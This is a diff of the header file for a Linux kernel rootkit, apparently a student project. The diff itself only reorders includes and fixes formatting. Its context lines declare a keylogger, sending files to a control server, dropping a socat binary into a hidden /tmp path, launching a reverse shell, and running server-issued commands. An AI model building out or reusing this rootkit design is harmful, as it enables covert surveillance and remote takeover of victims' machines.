@@ -1,15 +1,15 @@
 #ifndef EPIROOTKIT_H
 #define EPIROOTKIT_H
 
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/errno.h>
+#include <linux/fs.h>
 #include <linux/ftrace.h>
-#include <linux/module.h>
-#include <linux/types.h>
 #include <linux/kallsyms.h>
+#include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/module.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 #include <linux/uaccess.h>
 
 // Utils macros
@@ -25,6 +25,7 @@
 			pr_info(fmt, ##args); 							\
 		} 													\
 	} while (0)
+
 #define ERR_MSG(fmt, args...) 								\
 	do { 													\
 		if (DEBUG) { 										\
@@ -93,7 +94,7 @@ void hash_to_str(const u8 *digest, char *output);			// Convert a hash to a strin
 
 // network.c
 int send_to_server(char *message, ...);						// Send a message to the server
-int receive_from_server(char *recv_buffer, int buffer_size); // Wait for a message from the server
+int receive_from_server(char *recv_buffer, int buffer_size);// Wait for a message from the server
 int send_file_to_server(char *filename);					// Send a file to the server
 int network_worker(void *data);								// Kernel thread for network communication
 int close_socket(void);										// Release the socket
@@ -109,7 +110,7 @@ int epikeylog_exit(void);									// Cleanup function for the keylogger
 // socat.c
 int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
 int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
-int launch_reverse_shell(char *args);								// Launch the reverse shell with socat
+int launch_reverse_shell(char *args);						// Launch the reverse shell with socat
 
 // rootkit_command.c
 int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
